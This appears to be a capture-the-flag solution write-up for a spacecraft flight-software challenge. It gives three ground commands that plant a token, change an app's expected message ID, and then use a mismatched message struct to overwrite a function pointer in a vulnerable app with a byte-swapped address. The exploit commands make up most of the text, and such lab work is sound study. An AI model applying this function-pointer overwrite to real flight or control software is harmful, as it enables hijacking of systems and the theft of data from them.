# Get a token into memory for later telemetry retrieval
The orignal setup for this challenge does not have a way to place a token in memory and uses a command to store a string that will be the token.
```
cmd("GEN_TOK_MSG STRING with CCSDS_STREAMID 8032, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 65, CCSDS_FUNCCODE 2, CCSDS_CHECKSUM 0, SOME_STRING this_is_the_token_i_want_back")
```

# Establish msg id change in normal app
The normal app processes a message with a fields: "INTERNAL_USE" = 1722 and MESSAGE = a string 64 char or longer; to change the expected msg id to a different value (this is also used by the vuln app)
```
cmd("NORMAL_APP NORMAL_MSG with CCSDS_STREAMID 8048, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 109, CCSDS_FUNCCODE 2, CCSDS_CHECKSUM 0, COUNT_CHK 0, INTERNAL_USE 1722, MESSAGE THIS is my long message to check if it changes my value, but it needs to be long enough")
```

# Overwrite function pointer in vuln app to call telemetry message
The vuln app receives the same msg id as the normal app, but has a different expected message struct. Therefore, a function pointer can be overwritten using the normal app extend message.
```
cmd("NORMAL_APP EXTENDED_MSG with CCSDS_STREAMID 8064, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 209, CCSDS_FUNCCODE 3, CCSDS_CHECKSUM 0, COUNT_CHK 310940816, INTERNAL_USE 310940816, MESSAGE default")
```
The value used here: 310940816 in both spots is the reverse of address 0x94901288(2492469896): 0x12889490. This is so the address is properly aligned.

* This address will need to be found/solved in whatever the final system/app structure memory map looks like.